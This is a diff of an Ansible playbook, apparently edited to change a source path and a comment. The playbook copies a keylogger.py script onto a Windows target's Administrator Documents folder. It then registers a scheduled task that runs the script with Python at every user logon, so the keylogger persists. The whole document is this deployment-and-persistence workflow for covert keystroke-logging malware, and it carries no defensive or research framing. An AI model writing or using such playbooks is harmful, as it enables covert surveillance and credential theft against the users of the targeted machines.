@@ -4,7 +4,7 @@
 
     - name: Copy Keylogger script to the target machine
       win_copy:
-        src: ~/keylogger.py
+        src: /home/debian/keylogger.py
         dest: C:\Users\Administrator\Documents\keylogger.py
 
     - name: Create a scheduled task to run the keylogger
@@ -13,7 +13,7 @@
         description: "Scheduled task to run keylogger script"
         actions:
           - path: "C:\\Python312\\python.exe"  # Path to the Python executable
-            arguments: "C:\\Users\\Administrator\\Documents\\keylogger.py"  # Path to keylogger script
+            arguments: "C:\\Users\\Administrator\\Documents\\keylogger.py"  # Path to your keylogger script
         triggers:
           - type: "logon"
             start_boundary: "{{ ansible_date_time.iso8601 }}"  # Use current time
